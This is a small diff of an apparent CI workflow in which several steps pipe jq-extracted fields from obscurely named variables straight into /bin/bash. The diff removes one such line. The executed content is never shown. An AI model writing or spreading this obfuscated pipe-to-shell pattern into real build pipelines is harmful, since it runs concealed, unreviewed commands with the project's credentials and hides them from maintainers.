@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$enkdz4190" | jq -r .fscjq678 | /bin/bash
           echo $q8 | jq -r .lx3447 | /bin/bash
           printf '%s' "$ql08993" | jq -r .fn26 | /bin/bash
-          printf '%s' "$zee70" | jq -r .rb193 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
